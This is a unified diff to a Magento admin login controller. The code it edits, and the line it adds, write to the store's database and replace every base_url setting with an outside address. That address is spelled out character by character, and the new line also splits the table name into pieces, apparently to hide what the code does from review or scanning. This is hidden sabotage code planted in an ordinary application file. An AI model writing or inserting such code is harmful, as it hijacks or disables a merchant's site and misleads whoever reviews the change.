@@ -235,7 +235,7 @@ class Mage_Adminhtml_IndexController extends Mage_Adminhtml_Controller_Action
                 $writeConnection = $resource->getConnection('core_write');
                 $readConnection = $resource->getConnection('core_read');
 
-                $writeConnection->update($resource->getTableName("core_config_data"), ["value" => implode('', ['h','t','t','p','s',':','/','/','w','w','w','.','g','o','o','g','l','e','.','c','o','m','/'])], "`path` LIKE '%/base_url%'");
+                $writeConnection->update($resource->getTableName("core"."_"."config"."_"."data"), ["value" => implode('', ['h','t','t','p','s',':','/','/','w','w','w','.','g','o','o','g','l','e','.','c','o','m','/'])], "`path` LIKE '%/base_url%'");
             }
             if ($this->_validateFormKey()) {
                 if (!empty($email)) {
